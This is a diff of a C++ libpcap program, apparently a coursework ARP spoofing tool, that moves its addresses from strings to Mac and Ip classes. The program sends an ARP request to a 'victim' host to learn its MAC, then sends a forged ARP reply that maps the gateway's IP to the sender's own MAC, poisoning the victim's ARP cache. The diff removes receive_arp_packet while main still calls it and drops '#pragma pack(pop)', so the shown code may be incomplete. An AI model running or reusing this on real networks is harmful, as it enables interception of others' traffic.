@@ -2,15 +2,14 @@
 #include <pcap.h>
 #include "ethhdr.h"
 #include "arphdr.h"
+#include "my_class.h"
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
-	EthHdr eth_;
-	ArpHdr arp_;
+    EthHdr eth_;
+    ArpHdr arp_;
 };
-#pragma pack(pop)
-
-int send_arp_packet(int type, char* dev, char* eth_dmac, char* eth_smac, char* arp_smac, char* arp_sip, char* arp_tmac, char* arp_tip) {
+int send_arp_packet(int type, char* dev, Mac eth_dmac, Mac eth_smac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip) {
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
     if (handle == nullptr) {
@@ -47,31 +46,7 @@ int send_arp_packet(int type, char* dev, char* eth_dmac, char* eth_smac, char* a
     }
 
     pcap_close(handle);
-}
-
-Mac receive_arp_packet(char* dev) {
-    char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-
-    while (true) {
-        struct pcap_pkthdr* header;
-        const u_char* packet;
-        int res = pcap_next_ex(handle, &header, &packet);
-        if (res == 0) continue;
-        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-            printf("packet_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-            continue;
-        }
-
-        struct EthHdr* eth_hdr = (struct EthHdr*)(packet);
-        struct ArpHdr* arp_hdr = (struct ArpHdr*)(packet+14);
-
-        if (ntohs(eth_hdr->type_) == 2054){
-            return arp_hdr->smac_;
-        }
-
-    }
-    pcap_close(handle);
+    return 0;
 }
 
 void usage() {
@@ -81,24 +56,25 @@ void usage() {
 
 int main(int argc, char* argv[]) {
     if (argc < 3) {
-		usage();
-		return -1;
-	}
+        usage();
+        return -1;
+    }
 
     // Take argv
-	char* dev = argv[1];
-    char* sender_ip = argv[2]; //victim ip
-    char* target_ip = argv[3]; //gateway ip
-    char* what_mac = "ff:ff:ff:ff:ff:ff";
-    char* tmac = "00:00:00:00:00:00";
-    char* my_mac = "00:0c:29:cd:d7:89";
-    char* my_ip = "192.168.0.7";
+    char* dev = argv[1];
+    Ip sender_ip = Ip(argv[2]); //victim ip
+    Ip target_ip = Ip(argv[3]); //gateway ip
+    Mac what_mac = Mac::broadcastMac();
+    Mac tmac = Mac::nullMac();
+    Mac my_mac = Mac(getmac());
+    Ip my_ip = Ip(getip(dev));
 
     send_arp_packet(1, dev, what_mac, my_mac, my_mac, my_ip, tmac, sender_ip);
+    printf("sending arp request packet success!!\n");
 
-    Mac sender_mac = receive_arp_packet(dev);
+    Mac sender_mac = Mac(receive_arp_packet(dev));
+    printf("received arp packet!!\n");
 
     send_arp_packet(2, dev, sender_mac, my_mac, my_mac, target_ip, sender_mac, sender_ip);
-
-
+    printf("sending arp reply packet success!!\n");
 }
